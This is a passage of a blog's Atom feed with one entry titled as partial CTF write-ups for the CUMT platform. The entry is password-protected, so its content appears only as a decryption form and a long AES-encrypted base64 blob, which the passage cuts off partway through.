<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2018-10-04T10:01:49.686Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CUMT平台的部分题解</title>
    <link href="0verwatch.top/2018/09/30/CUMT-CTF-Platform/"/>
    <id>0verwatch.top/2018/09/30/CUMT-CTF-Platform/</id>
    <published>2018-09-30T06:59:37.000Z</published>
    <updated>2018-10-04T10:01:49.686Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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